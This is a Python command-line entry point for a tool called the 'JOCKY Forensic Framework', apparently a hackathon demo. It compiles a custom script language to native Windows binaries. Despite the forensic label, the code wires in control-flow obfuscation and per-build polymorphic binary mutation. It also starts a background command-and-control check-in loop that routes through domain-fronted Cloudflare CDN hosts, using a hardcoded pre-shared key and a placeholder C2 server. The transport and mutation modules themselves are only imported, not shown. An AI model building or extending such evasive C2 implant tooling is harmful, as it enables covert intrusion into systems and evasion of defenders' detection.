"""
JOCKY Forensic Framework — Main Entry Point
============================================
Full compiler + agent pipeline CLI.

Usage:
    python main.py compile <script.jky> [--obfuscate] [--output <dir>]
    python main.py run     <script.jky> [--obfuscate] [--target local|remote]
    python main.py verify  <log.json>   [--key <pubkey_hex>]
    python main.py dashboard

Phases wired here:
    Phase 2  — parse      (.jky -> AST)
    Phase 3  — validate   (semantic constraints)
    Phase 4  — IR gen     (AST -> LLVM IR)
    Phase 5  — CFG obfusc (opaque predicates, junk blocks)
    Phase 6  — Polymorphic build (per-build binary mutation)
    Phase 14 — CDN-aware transport router (C2 check-in / checkin-loop)
    Phase 17 — Hash-chain integrity (log signing + verification)
"""

from __future__ import annotations

import argparse
import logging
import os
import shutil
import subprocess
import sys
import threading
import time
from pathlib import Path

# UTF-8 console output on Windows
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
if hasattr(sys.stderr, "reconfigure"):
    try:
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# Path bootstrap
_ROOT = Path(__file__).resolve().parent
_LANG = _ROOT / "language"
_LEX  = _LANG  / "lexer_parser"
_LLVM = _LANG  / "llvm_frontend"
_PIPE = _ROOT  / "build_pipeline"       # was missing from original
_OBFU = _PIPE  / "obfuscator"           # build_pipeline/obfuscator/
_INTG = _ROOT  / "integrity"

for _p in [str(_ROOT), str(_LEX), str(_LLVM),
           str(_PIPE), str(_OBFU), str(_INTG)]:
    if _p not in sys.path:
        sys.path.insert(0, _p)

# venv auto-switch
try:
    import lark  # noqa: F401
except ImportError:
    _venv_python = _ROOT / ".venv" / "Scripts" / "python.exe"
    if _venv_python.exists() and \
       sys.executable.lower() != str(_venv_python).lower():
        _res = subprocess.run([str(_venv_python)] + sys.argv, cwd=os.getcwd())
        sys.exit(_res.returncode)
    else:
        print("[jocky] Error: required package 'lark' not found.", file=sys.stderr)
        print("[jocky] Run: .\\.venv\\Scripts\\python.exe main.py ...", file=sys.stderr)
        sys.exit(1)

# Core language pipeline
from parser       import JOCKYParseError, parse_file
from validator    import JOCKYValidationError, validate
from ir_generator import context_from_tree, generate_ir
from interpreter  import interpret

# Integrity chain
from hash_chain import HashChain
from signing    import ChainSigner
from verifier   import verify_chain

# Polymorphic pipeline (Phase 6) -- optional until pipeline.py is finalized
try:
    from pipeline import PolymorphicPipeline
    _POLY_OK = True
except ImportError:
    _POLY_OK = False
    PolymorphicPipeline = None  # type: ignore[assignment,misc]

# Phase 14 transport -- optional so compile/verify work offline
try:
    from transport.cdn_router import JockyTransport
    _TRANSPORT_OK  = True
    _TRANSPORT_ERR = None
except Exception as _tr_err:
    _TRANSPORT_OK  = False
    _TRANSPORT_ERR = _tr_err

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(name)s %(levelname)s: %(message)s",
)
log = logging.getLogger("jocky.main")

# C2 / transport config (hardcoded for SIH demo)
AGENT_ID   = "jocky-agent-01"
PSK        = b"JOCKY_DEMO_PSK_32_BYTES_12345678"   # exactly 32 bytes
C2_BACKEND = "c2.example.com"
CDN_FRONTS = [
    "cdnjs.cloudflare.com",
    "ajax.cloudflare.com",
]


def run_transport() -> tuple:
    """
    Initialise JockyTransport and start the background check-in loop.
    Returns (transport, stop_event).
    """
    if not _TRANSPORT_OK:
        raise RuntimeError(
            f"Transport module unavailable: {_TRANSPORT_ERR}\n"
            "Ensure transport/cdn_router.py and its dependencies are present."
        )
    transport = JockyTransport(
        agent_id   = AGENT_ID,
        psk        = PSK,
        c2_backend = C2_BACKEND,
        fronts     = CDN_FRONTS,
    )
    stop = threading.Event()
    t    = threading.Thread(
        target=transport.run_checkin_loop,
        args=(stop,),
        daemon=True,
        name="jocky-transport",
    )
    t.start()
    log.info("[transport] check-in loop started (daemon thread)")
    return transport, stop


def _find_clang() -> str | None:
    for candidate in ["clang", "clang-17", "clang-16", "clang-15"]:
        if shutil.which(candidate):
            return candidate
    return None


def cmd_compile(args: argparse.Namespace) -> int:
    script = Path(args.script)
    if not script.exists():
        print(f"[jocky] Error: script not found -- {script}", file=sys.stderr)
        return 1

    out_dir = (Path(args.output) if getattr(args, "output", None)
               else script.parent / "build")
    out_dir.mkdir(parents=True, exist_ok=True)
    stem = script.stem

    # Phase 2: Parse
    print(f"[jocky] Phase 2 -- parsing {script.name} ...")
    try:
        tree = parse_file(script)
    except JOCKYParseError as exc:
        print(f"[jocky] Parse error:\n  {exc}", file=sys.stderr)
        return 1
    print("[jocky] Parse OK")

    # Phase 3: Validate
    print("[jocky] Phase 3 -- validating ...")
    try:
        validate(tree)
    except JOCKYValidationError as exc:
        print(f"[jocky] Validation error:\n  {exc}", file=sys.stderr)
        return 1
    print("[jocky] Validation OK")

    # Phase 4+5: IR generation + optional CFG obfuscation
    obfuscate = getattr(args, "obfuscate", False)
    print(f"[jocky] Phase 4+5 -- LLVM IR generation (obfuscate={obfuscate}) ...")
    ctx    = context_from_tree(tree)
    ir_txt = generate_ir(tree, ctx, obfuscate=obfuscate)

    ll_path = out_dir / f"{stem}.ll"
    ll_path.write_text(ir_txt, encoding="utf-8")
    print(f"[jocky] IR written -> {ll_path}  ({len(ir_txt):,} bytes)")

    # Phase 6a: Compile IR -> native binary
    clang     = _find_clang()
    bin_path  = out_dir / (stem + (".exe" if sys.platform == "win32" else ""))
    final_bin = bin_path

    if not clang:
        print("[jocky] Warning: clang not found -- skipping native compilation.")
        print(f"[jocky] IR ready at {ll_path}. Compile manually:")
        print(f"        clang -O2 -o {out_dir / stem} {ll_path} "
              "execution_engine/forensics/*.c "
              "-lkernel32 -lpsapi -liphlpapi -ladvapi32")
    else:
        forensics_dir = _ROOT / "execution_engine" / "forensics"
        forensic_c    = [
            str(f) for f in forensics_dir.glob("*.c")
            if "test_" not in f.name
        ]
        clang_cmd = [
            clang, "-O2", "-o", str(bin_path),
            str(ll_path),
            *forensic_c,
            f"-I{forensics_dir}",
            f"-I{_ROOT / 'execution_engine'}",
            "-lkernel32", "-lpsapi", "-liphlpapi", "-ladvapi32",
        ]
        print(f"[jocky] Phase 6a -- compiling -> {bin_path}")
        result = subprocess.run(clang_cmd, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[jocky] Clang error:\n{result.stderr}", file=sys.stderr)
            return 1
        print(f"[jocky] Binary ready -> {bin_path}")

        # Phase 6b: Polymorphic mutation
        if sys.platform == "win32" and bin_path.exists():
            if _POLY_OK and PolymorphicPipeline is not None:
                print("[jocky] Phase 6b -- polymorphic mutation pass ...")
                try:
                    poly = PolymorphicPipeline(str(bin_path))
                    mutated_path = poly.run()
                    print(f"[jocky] Mutated binary -> {mutated_path}")
                    final_bin = Path(mutated_path)
                except Exception as exc:
                    print(f"[jocky] Warning: polymorphic pass failed -- {exc}")
            else:
                print("[jocky] Phase 6b -- build_pipeline/pipeline.py not "
                      "yet present, polymorphic pass skipped")

    # Phase 17: Hash-chain integrity entry
    chain_path = out_dir / "chain.json"
    try:
        chain    = HashChain(str(chain_path))
        entry_id = chain.append(
            event="compile",
            data={
                "script":    str(script),
                "case_id":   ctx.case_id,
                "operator":  ctx.operator,
                "target":    ctx.target,
                "mode":      ctx.mode,
                "obfuscate": obfuscate,
                "ir_bytes":  len(ir_txt),
                "binary":    str(final_bin) if final_bin.exists()
                             else str(bin_path),
            }
        )
        signer = ChainSigner(str(out_dir / "signing.key"))
        signer.sign_entry(chain, entry_id)
        print(f"[jocky] Phase 17 -- chain entry #{entry_id} signed -> {chain_path}")
    except Exception as exc:
        print(f"[jocky] Warning: integrity chain failed -- {exc}")

    print(f"\n[jocky] Build complete. Output: {out_dir}")
    return 0


def cmd_run(args: argparse.Namespace) -> int:
    script = Path(args.script)
    if not script.exists():
        print(f"[jocky] Error: script not found -- {script}", file=sys.stderr)
        return 1

    target = getattr(args, "target", "local")

    if target == "remote":
        print("[jocky] Target mode: REMOTE C2")
        print(f"[jocky] Initialising transport "
              f"(agent={AGENT_ID}, c2={C2_BACKEND}) ...")
        if not _TRANSPORT_OK:
            print(f"[jocky] Error: transport unavailable -- {_TRANSPORT_ERR}",
                  file=sys.stderr)
            return 1
        try:
            transport, stop = run_transport()
            print("[jocky] Phase 14 -- transport check-in loop running.")
            print("[jocky] Press Ctrl+C to stop.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[jocky] Stopping transport...")
                stop.set()
                transport.close()
            return 0
        except Exception as exc:
            print(f"[jocky] Transport error: {exc}", file=sys.stderr)
            return 1

    # Local execution
    print("[jocky] Target mode: LOCAL")
    compile_args = argparse.Namespace(
        script    = args.script,
        obfuscate = getattr(args, "obfuscate", False),
        output    = getattr(args, "output", None),
    )
    rc = cmd_compile(compile_args)
    if rc != 0:
        return rc

    out_dir      = (Path(compile_args.output) if compile_args.output
                    else script.parent / "build")
    stem         = script.stem
    mutated_bin  = out_dir / f"{stem}_mut.exe"
    standard_bin = out_dir / (stem + (".exe" if sys.platform == "win32" else ""))
    run_bin      = (mutated_bin  if mutated_bin.exists()  else
                    standard_bin if standard_bin.exists() else None)

    if run_bin and run_bin.exists():
        print(f"\n[jocky] Executing native binary: {run_bin} ...")
        proc = subprocess.run([str(run_bin)], cwd=str(out_dir))
        return proc.returncode

    print("\n[jocky] Native binary unavailable -- falling back to "
          "interpreter (Phase 4) ...")
    try:
        tree    = parse_file(script)
        results = interpret(tree)
        print(f"[jocky] Interpreted {len(results)} operations successfully.")
        return 0
    except Exception as exc:
        print(f"[jocky] Interpreter error: {exc}", file=sys.stderr)
        return 1


def cmd_verify(args: argparse.Namespace) -> int:
    chain_path = Path(args.chain)
    if not chain_path.exists():
        print(f"[jocky] Error: chain file not found -- {chain_path}",
              file=sys.stderr)
        return 1

    key_hex = getattr(args, "key", None)
    if not key_hex:
        candidate_key = chain_path.parent / "signing.key"
        if candidate_key.exists():
            try:
                signer  = ChainSigner(str(candidate_key))
                key_hex = getattr(signer, "_public_key_hex", None)
            except Exception:
                pass

    print(f"[jocky] Verifying chain: {chain_path}")
    ok, report = verify_chain(str(chain_path), public_key_hex=key_hex)
    try:
        print(report)
    except UnicodeEncodeError:
        print(report.encode("ascii", errors="replace").decode("ascii"))
    return 0 if ok else 1


def cmd_dashboard(args: argparse.Namespace) -> int:
    api_path = _ROOT / "management_interface" / "dashboard" / "api.py"
    if not api_path.exists():
        print("[jocky] Dashboard not yet built (Phase 17 pending).",
              file=sys.stderr)
        return 1
    print("[jocky] Starting management dashboard (Phase 17) ...")
    subprocess.run([sys.executable, str(api_path)], check=False)
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(
        prog="jocky",
        description="JOCKY Forensic Framework -- compiler + agent pipeline",
    )
    sub = ap.add_subparsers(dest="command", required=True)

    p_c = sub.add_parser("compile",
                          help="Compile a .jky script to native binary")
    p_c.add_argument("script")
    p_c.add_argument("--obfuscate", action="store_true",
                     help="CFG obfuscation (opaque predicates + junk blocks)")
    p_c.add_argument("--output", "-o", metavar="DIR",
                     help="Output directory (default: <script_dir>/build)")

    p_r = sub.add_parser("run",
                          help="Run a .jky script locally or via remote C2")
    p_r.add_argument("script")
    p_r.add_argument("--obfuscate", action="store_true")
    p_r.add_argument("--target", choices=["local", "remote"], default="local",
                     help="local (default) or remote (Phase 14 transport)")
    p_r.add_argument("--output", "-o", metavar="DIR")

    p_v = sub.add_parser("verify",
                          help="Verify a hash-chain integrity log (Phase 17)")
    p_v.add_argument("chain", help="Path to chain.json")
    p_v.add_argument("--key", default=None,
                     help="Ed25519 public key hex for signature verification")

    sub.add_parser("dashboard", help="Launch management dashboard (Phase 17)")

    parsed = ap.parse_args()
    return {
        "compile":   cmd_compile,
        "run":       cmd_run,
        "verify":    cmd_verify,
        "dashboard": cmd_dashboard,
    }[parsed.command](parsed)


if __name__ == "__main__":
    sys.exit(main())